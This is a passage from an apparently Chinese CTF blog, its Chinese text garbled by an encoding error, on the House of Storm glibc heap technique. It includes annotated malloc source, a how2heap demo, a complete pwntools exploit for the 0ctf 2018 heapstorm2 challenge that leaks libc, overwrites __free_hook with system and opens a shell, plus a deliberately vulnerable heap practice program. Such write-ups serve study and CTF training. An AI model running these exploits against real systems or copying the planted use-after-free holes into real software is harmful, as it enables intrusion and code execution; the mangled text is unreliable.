ä¹Ÿå°±æ˜¯è¯´å¦‚æœä¸æ˜¯ä¸»è¿›ç¨‹,è®¾ç½®NON_MAIN_ARENAä½        if (av != &amp;main_arena)            victim-&gt;size |= NON_MAIN_ARENA;         check_malloced_chunk(av, victim, nb); // é»˜è®¤ä¸åšä»»ä½•æ“ä½œ        void *p = chunk2mem(victim);//æŠŠchunkè½¬æ¢ä¸ºmemæŒ‡é’ˆ        alloc_perturb(p, bytes);//å°†pçš„meméƒ¨åˆ†å…¨éƒ¨è®¾ç½®ä¸ºbytes ,é»˜è®¤ä»€ä¹ˆä¹Ÿä¸åš        return p;    &#125;      //å¦‚æœä¸Šä¸€æ­¥å–å‡ºçš„chunkæ²¡æœ‰åŒ¹é…æˆåŠŸï¼Œé‚£ä¹ˆå°†è¯¥chunkæ”¾å…¥å¯¹åº”çš„binä¸­    //å¦‚æœåœ¨smallbinçš„èŒƒå›´,åˆ™æ”¾åˆ°å¯¹åº”å¤šsmall binä¸­    if (in_smallbin_range(size))     &#123;        victim_index = smallbin_index(size);//è·å–sizeå¯¹åº”çš„smallbinçš„index        bck = bin_at(av, victim_index);//bckæŒ‡å‘sizeå¯¹åº”çš„smallbinçš„é“¾è¡¨å¤´        //fwdæŒ‡å‘sizeå¯¹åº”çš„smallbinçš„é“¾è¡¨ä¸­çš„æ–°åŠ å…¥çš„chunk(small binä½¿ç”¨å¤´æ’æ³•)        fwd = bck-&gt;fd;    &#125;    else//å¦‚æœä¸å†smallbinçš„èŒƒå›´ï¼Œä¹Ÿå°±æ˜¯è¯´åœ¨large bin çš„èŒƒå›´    &#123;        victim_index = largebin_index(size);//è·å–sizeå¯¹åº”çš„large binçš„index        bck = bin_at(av, victim_index);//bckæŒ‡å‘sizeå¯¹åº”çš„large binçš„é“¾è¡¨å¤´        fwd = bck-&gt;fd;//fwdæŒ‡å‘sizeå¯¹åº”çš„large binçš„é“¾è¡¨ä¸­çš„æ–°åŠ å…¥çš„chunk                //å¦‚æœlarge bin éç©ºï¼Œåœ¨largbinè¿›è¡ŒæŒ‰é¡ºåºæ’å…¥        if (fwd != bck) &#123;            /* Or with inuse bit to speed comparisons */            size |= PREV_INUSE;            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);//é»˜è®¤ä¸å¯ç”¨assert            /*            \tlarge binä¸­çš„chunkæ˜¯æŒ‰ä»å¤§åˆ°å°æ’åˆ—çš„ï¼Œå¦‚æœsize &lt; large bin             \tçš„æœ€åä¸€ä¸ªchunkï¼Œè¯´æ˜sizeæ˜¯è¿™ä¸ªlarge binä¸­çš„æœ€å°çš„ï¼Œæˆ‘ä»¬æŠŠå®ƒ            \tåŠ å…¥åˆ°æ­¤large binå°¾éƒ¨ã€‚            */            if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) &#123;                                fwd = bck;                bck = bck-&gt;bk;                                /*                large bin ä¸­sizeæœ€å°çš„chunkçš„fd_nextsizeä¼šæŒ‡å‘sizeæœ€å¤§çš„                é‚£ä¸ªchunkï¼Œä¹Ÿå°±æ˜¯é¦–éƒ¨çš„chunkã€‚åŒæ ·ï¼Œlarge bin ä¸­sizeæœ€å¤§çš„                chunkçš„bk_nextsizeä¼šæŒ‡å‘sizeæœ€å°çš„é‚£ä¸ªchunkã€‚                victimçš„bk_nextsizeæŒ‡å‘large binåŸæ¥æœ€å°çš„chunkï¼Œå®ƒçš„                bk_nextsizeæŒ‡å‘æœ€å¤§çš„é‚£ä¸ªchunkã€‚é‚£ä¹ˆåŸæ¥çš„æœ€å°çš„å°±æˆäº†ç¬¬äºŒå°çš„äº†ã€‚                æŠŠå®ƒfd_nextsizeå’Œbk_nextsizeéƒ½ä¿®æ­£ã€‚                */                victim-&gt;fd_nextsize = fwd-&gt;fd;                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;                //æœ€å¤§sizeçš„chunkçš„bk_nextsizeï¼Œå’ŒåŸæ¥æœ€å°chunkçš„bk_nextsizeéƒ½æŒ‡å‘victim                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;            &#125;             else //å¦‚æœvictimä¸æ˜¯large bin ä¸­æœ€å°çš„chunk            &#123;                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);//é»˜è®¤ä¸å¯ç”¨assert                //ä»å¤§åˆ°å°ï¼ˆä»å¤´åˆ°å°¾ï¼‰æ‰¾åˆ°åˆé€‚çš„ä½ç½®                while ((unsigned long) size &lt; fwd-&gt;size) &#123;                    fwd = fwd-&gt;fd_nextsize;                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                &#125;\t\t\t\t//å¦‚æœsizeåˆšå¥½ç›¸ç­‰ï¼Œå°±ç›´æ¥åŠ å…¥åˆ°å…¶åé¢çœçš„æ”¹fd_nextsizeå’Œbk_nextsizeäº†                if ((unsigned long) size == (unsigned long) fwd-&gt;size)                    fwd = fwd-&gt;fd;                else                 &#123;                    //sizeä¸ç›¸ç­‰ï¼Œå³size&gt;fwd-&gt;sizeï¼ŒæŠŠvictimåŠ å…¥åˆ°çºµå‘é“¾è¡¨ä¸­                    victim-&gt;fd_nextsize = fwd;                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                    fwd-&gt;bk_nextsize = victim;                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                &#125;                bck = fwd-&gt;bk;            &#125;        &#125;         else //å¦‚æœlarge bin ä¸ºç©ºï¼Œå°†victimåŠ å…¥åˆ°çºµå‘åˆ—è¡¨        \tvictim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;    &#125;    //#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))    mark_bin(av, victim_index); //æŠŠvictimåŠ å…¥åˆ°çš„binçš„è¡¨ç¤ºä¸ºéç©º    //æŠŠvictimåŠ å…¥åˆ°large binçš„é“¾è¡¨ä¸­    victim-&gt;bk = bck;    victim-&gt;fd = fwd;    fwd-&gt;bk = victim;    bck-&gt;fd = victim;&#125;\nåœ¨è¿™é‡Œç”¨how2heapé‡Œglibc2.27çš„ä¾‹å­æ¥çœ‹å®ç°è·Ÿglibc2.23ä¸ä¸€æ ·çš„æ˜¯ï¼Œéšç€tcacheæœºåˆ¶çš„åŠ å…¥åœ¨2.27æ‰“storméœ€è¦å…ˆæŠŠtcachebinå¡«æ»¡æˆ‘åˆ é™¤äº†å¤§éƒ¨åˆ†çš„è‹±æ–‡ä½†ä¿ç•™äº†éƒ¨åˆ†è¿™æ ·æ‰çŸ¥é“æ‰“çš„æ˜¯pwn(doge)\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char filler[0x60];char target[0x60]; void init()&#123;        setvbuf(stdout, NULL, _IONBF, 0);        setvbuf(stdin, NULL, _IONBF, 0);        // clearenv();&#125;int get_shift_amount(char* pointer)&#123;\t\tint shift_amount = 0;\tlong long ptr = (long long)pointer;\t\t\twhile(ptr &gt; 0x20)&#123;\t\tptr = ptr &gt;&gt; 8; \t\tshift_amount += 1; \t&#125;\t\treturn shift_amount - 1; // Want amount PRIOR to this being zeroed out&#125;int main()&#123;\tinit();    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;\tint* tcaches[7];\tunsorted_bin = malloc ( 0x4e8 );  // size 0x4f0 \t// prevent merging \tmalloc ( 0x18 ); \tint shift_amount = get_shift_amount(unsorted_bin);\t\tprintf(&quot;Shift Amount: %d\\n&quot;, shift_amount); \tsize_t alloc_size = ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);\tif(alloc_size &lt; 0x10)&#123;\t\tprintf(&quot;Chunk Size: 0x%lx\\n&quot;, alloc_size);\t\tputs(&quot;Chunk size is too small&quot;);\t\texit(1);\t&#125;\talloc_size = (alloc_size &amp; 0xFFFFFFFFE) - 0x10; // Remove the size bits\tprintf(&quot;In this case, the chunk size is 0x%lx\\n&quot;, alloc_size);        // Checks to see if the program will crash or not        if((alloc_size &amp; 0x8) != 0 || (((alloc_size &amp; 0x4) == 0x4) &amp;&amp; ((alloc_size &amp; 0x2) != 0x2)))&#123;                puts(&quot;Please try again! :)&quot;);                                return 1;        &#125;//è¿™é‡Œcrashå¥½å¤šæ¬¡ :(\tif(alloc_size &lt; 0x410)&#123;\t\t// Fill up the TCache for the proper size\t\tfor(int i = 0; i &lt; 7; i++)&#123;\t\t\ttcaches[i] = malloc(alloc_size);\t\t&#125;\t\tfor(int i = 0; i &lt; 7; i++)&#123;\t\t\tfree(tcaches[i]);\t\t&#125;\t&#125;\telse&#123;\t\tputs(&quot;Not filling up the TCache&quot;);\t&#125;\tlarge_bin  =  malloc ( 0x4d8 );  // size 0x4e0 \t// prevent merging \tmalloc ( 0x18 );\t// FIFO \tfree ( large_bin );  // put small chunks first \tfree ( unsorted_bin );\t// Put the &#x27;large bin&#x27; chunk into the large bin\tunsorted_bin = malloc(0x4e8);\tfree(unsorted_bin);\t// The address that we want to write to!\tfake_chunk = target - 0x10;\t\t((size_t *)unsorted_bin)[1] = (size_t)fake_chunk; // unsorted_bin-&gt;bk\t// Only needs to be a valid address. \t(( size_t *) large_bin )[1]  =  (size_t)fake_chunk  +  8 ;  // large_bin-&gt;fd\t(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin-&gt;bk_nextsize\tprintf(&quot;String before: %s\\n&quot;, target);\tprintf(&quot;String pointer: %p\\n&quot;, target);\tptr = calloc(alloc_size, 1);\tstrncpy(ptr, &quot;\\x41\\x42\\x43\\x44\\x45\\x46\\x47&quot;, 0x58 - 1);\t\tprintf(&quot;String after %s\\n&quot;, target);\tprintf(&quot;Fake chunk ptr: %p\\n&quot;, ptr);\treturn 0;&#125;\n\nä¸çŸ¥é“ä¸ºä»€ä¹ˆåœ¨gdbé‡Œä¸€ç›´crashï¼Œä½†æ˜¯ç›´æ¥è¿è¡Œå¯ä»¥æˆåŠŸ :)æ²¡æ³•è°ƒè¯•æ”¾ä¸ªå®Œæ•´çš„è¿è¡Œç»“æœ\nHouse of Storm======================================Preparing chunks for the exploitPut one chunk into unsorted bin and the other into the large binThe unsorted bin chunk MUST be larger than the large bin chunk.Find the proper chunk size to allocate.Must be exactly the size of the written chunk from above.Shift Amount: 5In this case, the chunk size is 0x46Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)Done to prevent usage of TCache stashingVulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location. This is our target location to get from the allocatorLater on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the locationof your fake chunk.Misalign the location in order to use the primitive as a SIZE value.The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).Vulnerability #2!Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.Make allocation of the size that the value will be written for.Once the allocation happens, the madness beginsOnce in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to write a fake &#x27;size&#x27; value to the location of our target.After this, the target will have a valid size.Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a validsize and remove it from the bin.With this, we have pulled out an arbitrary chunk!String before: String pointer: 0x56053bf12040Make a call to &#x27;calloc&#x27; instead of &#x27;malloc&#x27; in order to not use the TCache on the allocation. Had to fill TCachebecause stashing would prevent the exploit from workingString after ABCDEFGFake chunk ptr: 0x56053bf12040\n\næ¥çœ‹é“ä¾‹é¢˜å§æ®è¯´å°±æ˜¯è¯¥æ”»å‡»æ‰‹æ³•çš„æ¥æº0ctf_2018_heapstorm2glibc2.23checksec\nâ””â”€$ checksec 0ctf_2018_heapstorm2[*] &#x27;/Desktop/0ctf_2018_heapstorm2&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\nâ€˜startâ€™\nif ( !mallopt(1, 0) )    exit(-1);        //banæ‰äº†fastbin  if ( mmap((void *)0x13370000, 0x1000uLL, 3, 34, -1, 0LL) != (void *)322371584 )//åœ¨0x13370000åˆ†é…ä¸€æ®µ0x1000çš„å†…å­˜    exit(-1);  fd = open(&quot;/dev/urandom&quot;, 0);  if ( fd &lt; 0 )    exit(-1);  if ( read(fd, (void *)0x13370800, 0x18uLL) != 24 )//å‘0x13370800è¯»å…¥24å­—èŠ‚çš„éšæœºæ•°    exit(-1);  close(fd);  MEMORY[0x13370818] = MEMORY[0x13370810];\nè¯»å…¥äº†3ä¸ªéšæœºæ•°ï¼Œç¬¬4ä¸ªå’Œç¬¬3ä¸ªä¸€æ ·ï¼Œæˆ‘ä»¬è®°ä½œr1,r2,r3,r4åˆå§‹åŒ–åé¢çš„åœ°å€ï¼Œç”¨r1å¼‚æˆ–0 ä½œä¸ºptrçš„å€¼ï¼Œr2å¼‚æˆ–0ä½œä¸ºsizeå€¼ï¼Œæˆ‘ä»¬ä¹‹åçš„ptréƒ½æ˜¯é€šè¿‡xor r1å¾—åˆ°çš„ï¼Œsizeéƒ½æ˜¯ xor r2å¾—åˆ°çš„\npwndbg&gt; x /40gx 0x133708000x13370800:    0x72cec7f9b44fb49e  0x438137bc554b405e0x13370810:    0x7a4f542a3248dba2  0x00000000000000000x13370820:    0x0000000000000000  0x00000000000000000x13370830:    0x0000000000000000  0x00000000000000000x13370840:    0x0000000000000000  0x00000000000000000x13370850:    0x0000000000000000  0x0000000000000000\n\n1.Allocateæ³¨æ„xor\nvoid __fastcall sub_DE6(_QWORD *a1)&#123;  __int64 v1; // rsi  int i; // [rsp+10h] [rbp-10h]  int v3; // [rsp+14h] [rbp-Ch]  void *v4; // [rsp+18h] [rbp-8h]  for ( i = 0; i &lt;= 15; ++i )  &#123;    v1 = a1[2 * i + 5];    if ( !sub_BCC(a1, v1) )    &#123;      printf(&quot;Size: &quot;);      v3 = sub_1551(&quot;Size: &quot;, v1);      if ( v3 &gt; 12 &amp;&amp; v3 &lt;= 4096 )      &#123;        v4 = calloc(v3, 1uLL);        if ( !v4 )          exit(-1);        a1[2 * i + 5] = sub_BCC(a1, v3); //a1[i+2].m_size = a1[0].m_size ^ input_size        a1[2 * i + 4] = sub_BB0(a1, (__int64)v4);//a1[i+2].m_heap = a1[0].m_heap ^ heap_addr        printf(&quot;Chunk %d Allocated\\n&quot;, (unsigned int)i);      &#125;      else      &#123;        puts(&quot;Invalid Size&quot;);      &#125;      return;    &#125;  &#125;&#125;\n2.Update\nint __fastcall sub_F21(_QWORD *a1, __int64 a2)&#123;  __int64 v2; // rsi  signed int v4; // [rsp+10h] [rbp-20h]  int v5; // [rsp+14h] [rbp-1Ch]  __int64 v6; // [rsp+18h] [rbp-18h]  printf(&quot;Index: &quot;);  v4 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v4 &gt; 0xF )    return puts(&quot;Invalid Index&quot;);  v2 = a1[2 * v4 + 5];  if ( !sub_BCC(a1, v2) )    return puts(&quot;Invalid Index&quot;);  printf(&quot;Size: &quot;);  v5 = sub_1551(&quot;Size: &quot;, v2);  if ( v5 &lt;= 0 || v5 &gt; (unsigned __int64)(sub_BCC(a1, a1[2 * v4 + 5]) - 12) )// 0&lt;v5&lt;=size -12    return puts(&quot;Invalid Size&quot;);  printf(&quot;Content: &quot;);  v6 = sub_BB0(a1, a1[2 * v4 + 4]);  sub_1377(v6, v5);//off-by-null  strcpy((char *)(v5 + v6), &quot;HEAPSTORM_II&quot;);  return printf(&quot;Chunk %d Updated\\n&quot;, (unsigned int)v4);&#125;\n3.Delete\nint __fastcall sub_109B(_QWORD *a1, __int64 a2)&#123;  void *v3; // rax  signed int v4; // [rsp+1Ch] [rbp-4h]  printf(&quot;Index: &quot;);  v4 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v4 &gt; 0xF || !sub_BCC(a1, a1[2 * v4 + 5]) )    return puts(&quot;Invalid Index&quot;);  v3 = (void *)sub_BB0(a1, a1[2 * v4 + 4]);  free(v3);  a1[2 * v4 + 4] = sub_BB0(a1, 0LL);//ptr  a1[2 * v4 + 5] = sub_BCC(a1, 0LL);//sizeè¿™ä¿©éƒ½åªæ˜¯è¢«xoräº†ï¼Œæ²¡æ¸…é›¶  return printf(&quot;Chunk %d Deleted\\n&quot;, (unsigned int)v4);&#125;\n4.View\nint __fastcall sub_11B5(_QWORD *a1, __int64 a2)&#123;  __int64 v3; // rbx  __int64 v4; // rax  signed int v5; // [rsp+1Ch] [rbp-14h]  if ( (a1[3] ^ a1[2]) != 322401073LL )//è¦æ»¡è¶³r2 xor r3 = 0x13377331æ‰å¯ä»¥view    return puts(&quot;Permission denied&quot;);  printf(&quot;Index: &quot;);  v5 = sub_1551(&quot;Index: &quot;, a2);  if ( (unsigned int)v5 &gt; 0xF || !sub_BCC(a1, a1[2 * v5 + 5]) )    return puts(&quot;Invalid Index&quot;);  printf(&quot;Chunk[%d]: &quot;, (unsigned int)v5);  v3 = sub_BCC(a1, a1[2 * v5 + 5]);  v4 = sub_BB0(a1, a1[2 * v5 + 4]);  sub_14D4(v4, v3);  return puts(byte_180A);&#125;\nå›é¡¾ä¸€ä¸‹house of stormçš„æ¡ä»¶glibcç‰ˆæœ¬å°äº2.30This requires the following:Write on free unsorted bin chunkWrite on free large bin chunkKnown address of target memory addressKnown address of upper bits of heap chunk\nç¨‹åºå¯èƒ½crashå¤šè·‘å‡ æ¬¡\nfrom pwn import *from pwn import p32,p64,u32,u64context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,25201)#p = process(&#x27;./0ctf_2018_heapstorm2&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)def add(size):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;1&#x27;)    p.sendlineafter(b&#x27;Size: &#x27;,str(size))def edit(idx,content):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;2&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(idx))    p.sendlineafter(b&#x27;Size: &#x27;,str(len(content)))    p.recvuntil(b&#x27;Content: &#x27;)    p.send(content)def delete(idx):    p.recvuntil(&#x27;Command: &#x27;)    p.sendline(&#x27;3&#x27;)    p.recvuntil(&#x27;Index: &#x27;)    p.sendline(&#x27;%d&#x27; % idx)def show(idx):    p.sendlineafter(b&#x27;Command: &#x27;,b&#x27;4&#x27;)    p.sendlineafter(b&#x27;Index: &#x27;,str(idx))#---------------å †é£æ°´ï¼Œå¯åŠ¨ï¼-------------------------#add(0x18)#chunk0\t  off_by_nullä¿®æ”¹1çš„sizeadd(0x508)#chunk1add(0x18)#chunk2#---------------add(0x18)#chunk3   off_by_nullä¿®æ”¹4çš„sizeadd(0x508)#chunk4add(0x18)#chunk5   #---------------add(0x18)#chunk6   é˜²æ­¢åˆå¹¶åˆ°top_chunk#----------------unsorted chunk-----------------------#edit(1,b&#x27;\\x00&#x27;*0x4F0 + p64(0x500)) #fake_chunkdelete(1)edit(0,b&#x27;\\x00&#x27;*(0x18-12)) #ä¿®æ”¹chunk1çš„sizeï¼Œ 0x511-&gt;0x500add(0x18) #chunk1 add(0x4d8) #chunk7    æŠŠ0x500ç”¨å®Œdelete(1)   delete(2) #chunk1-chunk2 åˆå¹¶   è¿™æ˜¯å°±å­˜åœ¨å †é‡å add(0x38)#chunk1add(0x4e8)#chunk2   chunk7çš„contentæŒ‡å‘chunk2çš„chunk-0x10ä½ç½®å¤„,æˆ‘ä»¬å¯ä»¥å®ç°æ§åˆ¶unsorted chunk#-------------------large chunk-----------------------------------#edit(4,b&#x27;\\x00&#x27;*0x4F0+p64(0x500))#fake_chunkdelete(4)edit(3,b&#x27;\\x00&#x27;*(0x18-12)) #ä¿®æ”¹chunk4çš„sizeï¼Œ 0x511-&gt;0x500add(0x18) #chunk4add(0x4d8) #chunk8   æŠŠ0x500ç”¨å®Œdelete(4)delete(5) #chunk4-chunk5 åˆå¹¶ è¿™æ˜¯å°±å­˜åœ¨å †é‡å add(0x48)#chunk4  æ­¤æ—¶unsorted binä¸­å‰©ä¸‹ä¸€ä¸ª0x4e1å¤§å°çš„chunkï¼Œä¸”ä¸chunk8é‡å ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°æ§åˆ¶large chunk#---------------unsorted chunk å’Œ large chunk ----------------------#delete(2)add(0x4e8) #æŠŠ0x4e1çš„chunkæ”¾å…¥åˆ°largebinä¸­delete(2)  #æŠŠ0x4F1çš„chunkæ”¾å…¥åˆ°unsorted binä¸­#---------------storm approching------------------------------#fake_chunk = 0x13370800 - 0x20payload = b&#x27;\\x00&#x27; * 0x10 payload += p64(0) payload += p64(0x4f1) payload += p64(0) payload += p64(fake_chunk)edit(7, payload) #ä¿®æ”¹unsorted chunkçš„bkpayload = b&#x27;\\x00&#x27; * 0x20 payload += p64(0) payload += p64(0x4e1) payload += p64(0) payload += p64(fake_chunk+8) payload += p64(0) payload += p64(fake_chunk-0x18-5)edit(8, payload) #ä¿®æ”¹ large chunk çš„ bk å’Œ bk_nextsizeadd(0x48)  #chunk2  -&gt; 0x133707e0   æˆåŠŸå°†ç”³è¯·åˆ°äº†heaparrayé™„è¿‘#-----------------------æ³„æ¼ libc----------------------------------##ç”±äºbinsä¸­çš„chunkçš„fd,bkæŒ‡å‘libcçš„åœ°å€ï¼Œæˆ‘ä»¬å…ˆè¦æ³„æ¼heapçš„åœ°å€payload = p64(0)*6 + p64(0x13370800)edit(2, payload) #ä¿®æ”¹äº†r0~r4ä¸º0ï¼Œå¹¶ä¸”ä¿®æ”¹äº†chunk0çš„åœ°å€ï¼Œæ­¤æ—¶çš„chunk0çš„sizeéå¸¸å¤§ï¼Œå› ä¸ºå¼‚æˆ–çš„æ˜¯0payload = p64(0)*3 +p64(0x13377331)  #æ»¡è¶³showçš„æ¡ä»¶payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(fake_chunk+3) + p64(8)   #chunk1edit(0, payload) #æ»¡è¶³showçš„æ¡ä»¶show(1)  #æˆ‘ä»¬åˆšåˆšhouse of storm å†™çš„åœ°å€æ³„æ¼å‡ºæ¥p.recvuntil(&quot;]: &quot;)heap = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))success(&quot;heap:%s&quot;+hex(heap))payload  = p64(0)*3 + p64(0x13377331)#æ»¡è¶³showçš„æ¡ä»¶payload += p64(0x13370800) + p64(0x1000) #chunk0payload += p64(heap+0x10) + p64(8) #chunk1edit(0, payload)show(1) #æ³„æ¼libcåœ°å€p.recvuntil(&quot;]: &quot;)malloc_hook = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;)) -0x58 - 0x10libc_base = malloc_hook - libc.sym[&#x27;__malloc_hook&#x27;]free_hook = libc_base+libc.sym[&#x27;__free_hook&#x27;]system = libc_base+ libc.sym[&#x27;system&#x27;]success(&quot;free_hook:%s&quot;+hex(free_hook))#--------------ä¿®æ”¹ free_hook -----------------------------------#payload  = p64(0)*4payload += p64(free_hook) + p64(0x100)#chunk0payload += p64(0x13370800+0x40) + p64(8)#chunk1payload += b&#x27;/bin/sh\\x00&#x27;edit(0, payload)edit(0, p64(system))delete(1)p.interactive()\n\n\nI am the storm that is approachingæˆ‘å³æ˜¯é‚£è¿«è¿‘çš„é£æš´Provoking black clouds in isolationå”¤é†’æ¨Šç¬¼ä¸­çš„ä¹Œäº‘I am reclaimer of my nameæˆ‘è¦æ”¶å›æˆ‘çš„çœŸåBorn in flames, I have been blessedç”Ÿäºç«ç„°Â å—å°½ç¥ç¦My family crest is a demon of death!æ­»äº¡æ¶é­”å³æ˜¯æˆ‘çš„å®¶å¾½Forsakened, I am awakenedè§‰é†’æ—¶å·²è¢«é—å¼ƒA phoenix&#x27;s ash in dark divineå‡¤å‡°çš„ç°çƒ¬åœ¨é»‘æš—ç¥çµæ—é£˜è½Descending miseryè‹¦éš¾é™ä¸´Destiny chasing timeå‘½è¿è¿½é€ç€æ—¶å…‰","categories":["heap"],"tags":["bin"]},{"title":"preparation_4_binattacks","url":"/2023/08/28/preparation-4-binattacks/","content":"å†™äº†æ®µä»£ç æ¥gankæ¥ä¸‹æ¥çš„å †,ä¹‹åå‡ ç¯‡æ–‡ç« éƒ½ç”¨è¿™ä½œä¸ºäºŒè¿›åˆ¶æ–‡ä»¶åŸºç¡€\n//gcc 2heap.c  -no-pie -o 2heap#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int chunk_time =0;int chunk_size[50];char *chunk_ptr[50];void init()&#123;    setvbuf(stdout, 0, 2, 0);    setvbuf(stdin, 0, 2, 0);&#125;void menu()&#123;    puts(&quot;what u want to do next?&quot;);    puts(&quot;1. Build a house&quot;);\tputs(&quot;2. Delete a house&quot;);\tputs(&quot;3. Edit your house&quot;);\tputs(&quot;4. Show your house&quot;);    puts(&quot;&gt;&quot;);&#125;void add()&#123;    char size[20];    if(chunk_time&lt;=32&amp;&amp;chunk_time&gt;=0)&#123;        if(!chunk_ptr[chunk_time])&#123;        printf(&quot;You have built %d houses in my world\\n&quot;,chunk_time);        puts(&quot;You can customize the size of house here, but what about your life&quot;);        read(0,size,0x8);        chunk_size[chunk_time] = atoi(size);\t\tchunk_ptr[chunk_time] = malloc(chunk_size[chunk_time]);\t\tputs(&quot;add something to your house&quot;);        read(0,chunk_ptr[chunk_time],chunk_size[chunk_time]);        chunk_time++;        &#125;else&#123;            puts(&quot;something wrong,but you can come in any time&quot;);            exit(0);        &#125;    &#125;else&#123;                puts(&quot;something wrong,but you can come in any time&quot;);        exit(0);    &#125;&#125;void delete()&#123;    int index;    puts(&quot;I won&#x27;t set the pointer to zero&quot;);    puts(&quot;every decision you made is meaningful&quot;);    scanf(&quot;%d&quot;,&amp;index);    free(chunk_ptr[index]);&#125;void edit()&#123;    int index;    puts(&quot;something wrong?&quot;);    puts(&quot;It&#x27;s never too late to make changes&quot;);    scanf(&quot;%d&quot;,&amp;index);    puts(&quot;something interesting here&quot;);    read(0,&amp;chunk_size[index],0x8);    puts(&quot;Nice choice!&quot;);    puts(&quot;Now add something&quot;);    read(0,chunk_ptr[index],chunk_size[index]);    puts(&quot;ok\\n&quot;);&#125;void show()&#123;    puts(&quot;Nothing is perfect,but you can make something different&quot;);    puts(&quot;Let&#x27;s see what you can do&quot;);    int index;    scanf(&quot;%d&quot;,&amp;index);    puts(chunk_ptr[index]);&#125;int main()&#123;    int choice;    init();    puts(&quot;This program is used to explore something about heap&quot;);    puts(&quot;written by str1k3&quot;);    puts(&quot;Welcome to my world!&quot;);    puts(&quot;In my world,you can build up some houses&quot;);        while(1)&#123;        menu();        scanf(&quot;%d&quot;,&amp;choice);        switch(choice)&#123;            case 1:                add();                break;            case 2:                delete();                break;            case 3:                edit();                break;            case 4:                show();                break;            case 5:                puts(&quot;ready to exit?&quot;);                puts(&quot;back to your life!&quot;);                exit(0);                break;        &#125;    &#125;&#125;\nå…¶å®äººç”Ÿï¼Œå¹¶éè™šè€—ã€‚ä½•æ¥å°˜åŸƒé£èˆï¼Ÿ â€”â€”é™ˆå¥•è¿…ã€Šæ²™é¾™ã€‹\næ‰”ä¸ªæµ‹è¯•è„šæœ¬åœ¨è¿™é‡Œå…ˆ\nfrom struct import packfrom ctypes import *from LibcSearcher import *from pwn import *def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)p = process(&quot;./2heap&quot;)elf = ELF(&quot;./2heap&quot;)#libc = ELF(&quot;./libc-2.23.so&quot;)context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)def debug():    gdb.attach(p)    pause()def get_addr():    return u64(p.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8, b&#x27;\\x00&#x27;))def add(size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;1&#x27;)    p.recvuntil(&quot;You can customize the size of house here, but what about your life&quot;)    p.sendline(str(size))    p.recvuntil(&quot;add something to your house&quot;)    p.send(payload)def delete(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;2&#x27;)    p.recvuntil(&quot;I won&#x27;t set the pointer to zero, every decision you made,is meaningful.&quot;)    p.sendline(str(index))def edit(index,size,payload):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;3&#x27;)    p.recvuntil(&quot;It&#x27;s never too late to make changes.&quot;)    p.sendline(str(index))    p.recvuntil(&quot;something interesting here&quot;)    p.sendline(str(size))    p.recvuntil(&quot;Nice choice!&quot;)    p.send(payload)def show(index):    p.recvuntil(&quot;&gt;&quot;)    p.sendline(b&#x27;4&#x27;)    p.recvuntil(&quot;Let&#x27;s see what you can do&quot;)    p.sendline(str(index))\n\n","categories":["heap"],"tags":["bin"]},{"title":"pwnå…¥é—¨æŒ‡åŒ—","url":"/2023/07/02/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/","content":"To all begin pwnner\nä»€ä¹ˆæ˜¯Pwn    â€œPwnâ€æ˜¯ä¸€ä¸ªæ‹Ÿå£°è¯ï¼Œä»£è¡¨ç€æ”»ç 